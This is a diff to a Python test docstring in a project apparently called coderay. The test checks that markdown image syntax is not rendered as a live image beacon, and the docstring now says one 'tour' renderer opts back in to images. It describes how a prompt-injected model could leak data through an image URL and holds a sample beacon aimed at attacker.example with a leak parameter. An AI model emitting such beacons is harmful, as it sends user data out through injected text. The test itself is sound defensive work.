@@ -216,7 +216,9 @@ def test_render_does_not_turn_markdown_image_syntax_into_a_beacon(name):
     """coderay-q2r.53. `![x](https://attacker/p?leak=...)` rendered as a live
     <img> that fires on page open with no click: an exfiltration channel a
     prompt-injected model can reach from repo text. Every prose slot goes
-    through markdown-it, so the image rule is off in every renderer."""
+    through markdown-it, so the image rule is off in every renderer these
+    fixtures cover. The tour opts back in; see
+    tests/test_main.py::test_the_tour_opts_back_into_markdown_images."""
     d = GOLDEN / name
     shared = json.loads((d / "shared.json").read_text(encoding="utf-8"))
     beacon = "![x](https://attacker.example/p.png?leak=1)"
